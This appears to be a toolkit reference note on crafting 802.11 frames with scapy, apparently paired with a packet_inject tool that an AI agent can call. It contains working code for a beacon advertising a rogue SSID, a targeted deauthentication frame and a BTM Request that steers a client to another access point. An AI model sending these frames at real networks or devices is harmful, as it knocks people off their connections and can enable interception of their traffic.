# scapy 802.11 crafting

When we need a frame that no other tool emits well — a specific
BTM Action, a Neighbor Report Response, a custom Vendor-Specific IE
in a beacon, an ANQP GAS Initial Request — scapy is the answer.

## Class tree

```
RadioTap()                     # radiotap header (freq/rate/RSSI)
Dot11(...)                     # base 802.11 frame
Dot11Beacon(...)               # subtype-8 beacon body
Dot11ProbeReq(...)             # subtype-4 probe request
Dot11ProbeResp(...)            # subtype-5 probe response
Dot11Auth(...)                 # subtype-11 auth
Dot11AssoReq/Resp(...)         # subtype 0/1 association
Dot11Deauth(...)               # subtype-12 deauth (reason field)
Dot11Disas(...)                # subtype-10 disassoc
Dot11Elt(ID=n, info=b"...")    # 802.11 Information Element
```

## Basic recipe

```python
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

BSSID = "aa:bb:cc:dd:ee:ff"
SSID = "MyRogue"

beacon = (
    RadioTap() /
    Dot11(type=0, subtype=8,
          addr1="ff:ff:ff:ff:ff:ff",
          addr2=BSSID, addr3=BSSID) /
    Dot11Beacon(cap="ESS+privacy") /
    Dot11Elt(ID="SSID", info=SSID.encode()) /
    Dot11Elt(ID="DSset", info=b"\x06") /             # channel 6
    Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
)

sendp(beacon, iface="wlan1mon", inter=0.1, count=100)
```

## A deauth with reason 7

```python
deauth = (
    RadioTap() /
    Dot11(type=0, subtype=12,
          addr1="11:22:33:44:55:66",       # target
          addr2=BSSID,
          addr3=BSSID) /
    Dot11Deauth(reason=7)
)
sendp(deauth, iface="wlan1mon", count=5, inter=0.1)
```

## A BTM Request Action frame

Action frames use `type=0, subtype=13`. The body is (Category = 10
WNM, Action = 7 BTM Request, Dialog Token, Request Mode, Disassoc
Timer, Validity Interval, and optional Neighbor Report Elements).

The Neighbor Report Element (Element ID 52, length 13) layout:

```
+----+--------+---------+------------+------------+----------+---------+----------+
| ID | Length | BSSID   | BSSID Info | Op. Class  | Channel  | PHY Type| (subelts)|
| 52 | 13     | 6 bytes | 4 bytes    | 1 byte     | 1 byte   | 1 byte  | optional |
+----+--------+---------+------------+------------+----------+---------+----------+
```

Total Neighbor Report Element without subelements: 2-byte header +
13-byte body = 15 bytes.

```python
from scapy.all import RadioTap, Dot11, Dot11Action, Raw, sendp

STA       = "11:22:33:44:55:66"
AP_BSSID  = "aa:bb:cc:dd:ee:ff"

dialog_token       = 0x01
request_mode       = 0x00              # no preferred candidate list required
disassoc_timer_le  = 0x00              # 2-byte little-endian: 0 TBTTs
disassoc_timer_be  = 0x00
validity_interval  = 0xff              # 255 TBTTs

# 6-byte neighbor BSSID: 12:34:56:78:9a:bc
NEIGHBOR_BSSID_BYTES = bytes.fromhex("1234 5678 9abc".replace(" ", ""))

btm_req = (
    RadioTap() /
    Dot11(type=0, subtype=13,
          addr1=STA, addr2=AP_BSSID, addr3=AP_BSSID) /
    Dot11Action() /
    # Category = 10 (WNM), Action = 7 (BTM Request)
    Raw(load=bytes([0x0a, 0x07, dialog_token, request_mode,
                    disassoc_timer_le, disassoc_timer_be,
                    validity_interval])) /
    # Neighbor Report Element (IE 52)
    Raw(load=bytes([52, 13,                    # id, length = 13 bytes body
                    *NEIGHBOR_BSSID_BYTES,     # 6 B BSSID
                    0x00, 0x00, 0x00, 0x00,    # BSSID Info (reachability bits)
                    115,                        # Operating Class (5 GHz)
                    36,                         # Channel Number (5.180 GHz)
                    9]))                        # PHY Type (VHT = 9)
)
sendp(btm_req, iface="wlan1mon")
```

Malformed BTM bodies are silently dropped by most drivers — validate
with a scapy sniff on a second interface before assuming your emission
worked.

## The MCP wrapper

`packet_inject({iface, hex_or_pcap})` in the MCP takes either a hex
string or a path to a one-frame pcap. scapy is the canonical way to
generate the payload; the MCP just injects.

## Cite

- Scapy documentation — `scapy.layers.dot11`.
- IEEE Std 802.11-2020 §9.4 (frame layouts), §9.6 (Action frames).
